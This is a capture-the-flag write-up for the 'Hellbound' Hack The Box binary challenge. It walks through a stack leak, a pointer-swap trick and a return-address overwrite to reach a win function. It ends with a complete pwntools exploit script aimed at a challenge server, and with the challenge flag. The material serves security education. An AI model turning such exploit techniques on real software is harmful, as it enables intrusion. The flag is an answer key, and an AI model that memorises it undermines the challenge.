# Hellbound

We are given only the binary.

Running `checksec`
```bash
gef➤  checksec
Canary                        : ✓ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Full
```

## Analysis

Decompiled `main` function:
```c
undefined8 main(void)

{
  ulong uVar1;
  long in_FS_OFFSET;
  void *local_50 [8];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  local_50[0] = malloc(0x40);
  do {
    while( true ) {
      while( true ) {
        printf(&DAT_00401070);
        uVar1 = read_num();
        if (uVar1 != 2) break;
        printf("\n[*] Write some code: ");
        read(0,local_50[0],0x20);
      }
      if (2 < uVar1) break;
      if (uVar1 == 1) {
        printf("\n[+] In the back of its head you see this serial number: [%ld]\n",local_50);
      }
      else {
LAB_00400de9:
        printf("%s\n\n[-] Invalid option!\n",&DAT_0040105b);
      }
    }
    if (uVar1 != 3) {
      if (uVar1 == 0x45) {
        free(local_50[0]);
        printf("%s[*] The beast seems quiet.. for the moment..\n",&DAT_0040105b);
        if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
          return 0;
        }
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      goto LAB_00400de9;
    }
    local_50[0] = *(void **)((long)local_50[0] + 8);
    printf("%s\n[-] The beast went Berserk again!\n",&DAT_0040105b);
  } while( true );
}
```


There is a win function called `berserk_mode_off`. Clearly, we need to overwrite the return address to the address of the win function

We can leak stack address via `Analyze chipset` (Option 1).
```c
printf("\n[+] In the back of its head you see this serial number: [%ld]\n",local_50);
```

To understand better, here is its assembly code:
```
LEA        RAX=>local_50,[RBP + -0x48]
MOV        RSI,RAX
LEA        RDI,[s__[+]_In_the_back_of_its_head_you_004010   = "\n[+] In the back of its head
MOV        EAX,0x0
CALL       <EXTERNAL>::printf
```

With the leaked stack address, we can obtain the stack address containing the return address.

Looking at the stack, the stack address containing the return address has an offset 0x50 from the leaked stack address:
```bash
gef➤  tel 0x00007ffc699befe0 30
0x00007ffc699befe0│+0x0000: 0xffffffff318ad168	 ← $rsp
0x00007ffc699befe8│+0x0008: 0x0000000000a84010  →  0x0000000000000000	 ← $rsi
0x00007ffc699beff0│+0x0010: 0x0000000000000001
0x00007ffc699beff8│+0x0018: 0x0000000000400e5d  →  <__libc_csu_init+77> add rbx, 0x1
0x00007ffc699bf000│+0x0020: 0x00007ffc699bf02e  →  0x000000400e106c3e
0x00007ffc699bf008│+0x0028: 0x0000000000000000
0x00007ffc699bf010│+0x0030: 0x0000000000400e10  →  <__libc_csu_init+0> push r15
0x00007ffc699bf018│+0x0038: 0x0000000000400890  →  <_start+0> xor ebp, ebp
0x00007ffc699bf020│+0x0040: 0x00007ffc699bf110  →  0x0000000000000001
0x00007ffc699bf028│+0x0048: 0x6c3ee7207c73d700
0x00007ffc699bf030│+0x0050: 0x0000000000400e10  →  <__libc_csu_init+0> push r15	 ← $rbp
0x00007ffc699bf038│+0x0058: 0x00007f97312dc840  →  <__libc_start_main+240> mov edi, eax
```

To change control flow, we need to execute `return`. So, we need to provide option 69 (0x45).
```c
if (uVar1 != 3) {
    if (uVar1 == 0x45) {
        free(local_50[0]);
        printf("%s[*] The beast seems quiet.. for the moment..\n",&DAT_0040105b);
        if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
            return 0;
        }
        /* WARNING: Subroutine does not return */
        __stack_chk_fail();
    }
    goto LAB_00400de9;
}
```

As shown above, we can overwrite the content pointed by `local_50[0]` with option 2:
```c
read(0,local_50[0],0x20);
```

Interestingly, there is an interesting code in option 3:
```c
local_50[0] = *(void **)((long)local_50[0] + 8);
```

If we were to use option 2 and spray 8 random characters followed by the stack address of the return address, we can use option 3 to make `local_50[0]` contains the stack address of the return address. Then, we can modify the return address to our choice using option 2.

However, the program will crash if it returns when `local_50` contains the stack address of the return address as option 69 runs the following line of code:
```c
free(local_50[0]);
```

To resolve this issue, we can modify the return address with `address of the win function + p64(0)`. Then, use option 3 to make `local_50` contains 0. Then, running option 69 will not crash as `free(0)` does nothing (according to c standard).

## Exploit
Idea: Leak stack address and calculate the stack address of the return address. Modify the heap content to `8 random characters + stack address of return address`. Run option 3 to make `local_50` contains stack address of the return address. Modify the return address to `address of win function + p64(0)`. Run option 3 to make `local_50` contains 0. Run option 69 to change control flow to win function.
```python
from pwn import *

elf = ELF('./hellhound')
#r = elf.process()
r = remote('134.209.177.202', 30812)
#pause()

# leak stack address and calculate stack return address
r.sendlineafter(b'>> ', b'1') # analyze chipset
r.recvuntil(b'this serial number: [')
stack_leak = int(r.recvuntil(b']', drop=True).decode())
print("STACK LEAK: " + hex(stack_leak))
ret_stack_addr = stack_leak + 0x50
print("RET ADDR: " + hex(ret_stack_addr))

# modify the content of heap
r.sendlineafter(b'>> ', b'2') # modify hardware
payload = b'A' * 8 + p64(ret_stack_addr)
r.sendlineafter(b'Write some code: ', payload)

# local50[0] -> return address
r.sendlineafter(b'>> ', b'3') # check results

# modify the return address to address of win function
win = 0x400977
r.sendlineafter(b'>> ', b'2')
payload = p64(win) + p64(0) # abuse the fact that free(0) is no action
r.sendlineafter(b'Write some code: ', payload)

# local50[0] -> 0x0
r.sendlineafter(b'>> ', b'3')

# ret2win
r.sendlineafter(b'>> ', b'69')

r.interactive()
```

Flag: `HTB{1t5_5p1r1t_15_5tr0ng3r_th4n_m0d1f1c4t10n5}`